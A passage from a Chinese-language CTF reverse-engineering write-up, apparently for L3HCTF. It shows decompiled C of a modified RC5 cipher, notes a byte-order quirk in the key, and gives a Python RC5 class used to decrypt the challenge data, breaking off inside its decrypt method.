</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v20</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>v20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=o>++*</span><span class=n>v39</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=o>*</span><span class=kr>__fastcall</span> <span class=nf>sub_555555555E80</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>,</span> <span class=n>_DWORD</span> <span class=o>*</span><span class=n>a3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v26</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v27</span> <span class=o>=</span> <span class=n>a2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v28</span> <span class=o>=</span> <span class=n>a3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>v28</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v22</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v23</span> <span class=o>=</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v24</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v25</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span> <span class=o>=</span> <span class=n>v26</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v21</span> <span class=o>=</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>LODWORD</span><span class=p>(</span><span class=n>v21</span><span class=p>)</span> <span class=o>=</span> <span class=o>**</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>2</span><span class=p>))[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>v21</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v21</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=o>*</span><span class=n>v25</span> <span class=o>&lt;=</span> <span class=mh>0xCu</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v23</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v21</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=o>*</span><span class=n>v25</span><span class=p>))</span> <span class=o>+</span> <span class=p>(((</span><span class=o>*</span><span class=n>v24</span> <span class=o>^</span> <span class=o>*</span><span class=n>v23</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=o>*</span><span class=n>v24</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=o>*</span><span class=n>v24</span> <span class=o>^</span> <span class=o>*</span><span class=n>v23</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=o>*</span><span class=n>v24</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v24</span> <span class=o>=</span> <span class=p>(((</span><span class=o>*</span><span class=n>v23</span> <span class=o>^</span> <span class=o>*</span><span class=n>v24</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=o>*</span><span class=n>v23</span><span class=p>))</span> <span class=o>|</span> <span class=p>((</span><span class=o>*</span><span class=n>v23</span> <span class=o>^</span> <span class=o>*</span><span class=n>v24</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=o>*</span><span class=n>v23</span><span class=p>))</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>v21</span> <span class=o>+</span> <span class=mi>4LL</span> <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=o>*</span><span class=n>v25</span> <span class=o>+</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=n>v23</span> <span class=o>=</span> <span class=o>*</span><span class=n>v24</span> <span class=o>^</span> <span class=o>*</span><span class=n>v23</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>++*</span><span class=n>v25</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=n>v22</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=n>v24</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>**</span><span class=n>v22</span> <span class=o>=</span> <span class=o>*</span><span class=n>v23</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=o>*</span><span class=n>v11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>v12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>分析可知是RC5的密钥扩展和加密函数，其中加密函数地方做了魔改，对在轮加密种A多异或了B，解密脚本如下</p><p>还有个很坑的点卡了很久，密钥是<code>cleWtemoH3Lo!FTC</code>，而不是 WelcometoL3HCTF! ，正好是后者小端存储形式的字符串（需要动调去密钥扩展里看从内存里读取的到底是什么值）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RC5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>w</span> <span class=o>=</span> <span class=mi>32</span>  <span class=c1># 字长（比特）</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>r</span> <span class=o>=</span> <span class=mi>12</span>  <span class=c1># 轮数</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>  <span class=c1># 密钥长度</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>t</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>r</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>  <span class=c1># 密钥表大小</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mod</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=bp>self</span><span class=o>.</span><span class=n>w</span>  <span class=c1># 模数</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>S</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_expand_key</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_expand_key</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 初始化常量</span>
</span></span><span class=line><span class=cl>        <span class=n>P</span><span class=p>,</span> <span class=n>Q</span> <span class=o>=</span> <span class=mh>0xB7E15163</span><span class=p>,</span> <span class=mh>0x61C88647</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 初始化密钥表</span>
</span></span><span class=line><span class=cl>        <span class=n>S</span> <span class=o>=</span> <span class=p>[</span><span class=n>P</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>t</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>S</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>S</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>Q</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 将密钥转换为字列表</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>L</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>i</span> <span class=o>//</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>            <span class=n>shift</span> <span class=o>=</span> <span class=mi>8</span> <span class=o>*</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>L</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>+</span> <span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=n>shift</span><span class=p>))</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 混合密钥</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=n>B</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span> <span class=o>*</span> <span class=nb>max</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>t</span><span class=p>,</span> <span class=n>c</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>=</span> <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rotl</span><span class=p>((</span><span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>A</span> <span class=o>+</span> <span class=n>B</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>B</span> <span class=o>=</span> <span class=n>L</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rotl</span><span class=p>((</span><span class=n>L</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>+</span> <span class=n>A</span> <span class=o>+</span> <span class=n>B</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span><span class=p>,</span> <span class=p>(</span><span class=n>A</span> <span class=o>+</span> <span class=n>B</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>w</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>t</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>S</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>rotl</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>x</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>%=</span> <span class=bp>self</span><span class=o>.</span><span class=n>w</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>w</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>rotr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>x</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>n</span> <span class=o>%=</span> <span class=bp>self</span><span class=o>.</span><span class=n>w</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>w</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>decrypt_block</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 解析输入块</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>[:</span><span class=mi>4</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 解密过程</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>r</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>=</span> <span class=n>A</span> <span class=o>^</span> <span class=n>B</span>
</span></span><span class=line><span class=cl>            <span class=n>B</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rotr</span><span class=p>((</span><span class=n>B</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span><span class=p>,</span> <span class=n>A</span><span class=p>)</span> <span class=o>^</span> <span class=n>A</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>rotr</span><span class=p>((</span><span class=n>A</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span><span class=p>,</span> <span class=n>B</span><span class=p>)</span> <span class=o>^</span> <span class=n>B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=n>B</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=n>A</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 打包输出</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;II&#39;</span><span class=p>,</span> <span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>encrypt_block</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;加密一个64位数据块&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>[:</span><span class=mi>4</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 初始白化</span>
</span></span><span class=line><span class=cl>        <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=n>A</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=n>B</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 轮函数</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>r</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>rotl</span><span class=p>((</span><span class=n>A</span> <span class=o>^</span> <span class=n>B</span><span class=p>),</span> <span class=n>B</span><span class=p>)</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>            <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>rotl</span><span class=p>((</span><span class=n>B</span> <span class=o>^</span> <span class=n>A</span><span class=p>),</span> <span class=n>A</span><span class=p>)</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>S</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>])</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>mod</span>
</span></span><span class=line><span class=cl>            <span class=n>A</span> <span class=o>^=</span> <span class=n>B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;II&#39;</span><span class=p>,</span> <span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>plaintext</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;加密任意长度数据&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># 分块加密</span>
</span></span><span class=line><span class=cl>        <span class=n>blocks</span> <span class=o>=</span> <span class=p>[</span><span class=n>plaintext</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>ciphertext</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>block</span> <span class=ow>in</span> <span class=n>blocks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ciphertext</span> <span class=o>+=</span> <span class=bp>self</span><span class=o>.</span><span class=n>encrypt_block</span><span class=p>(</span><span class=n>block</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ciphertext</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>ciphertext</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
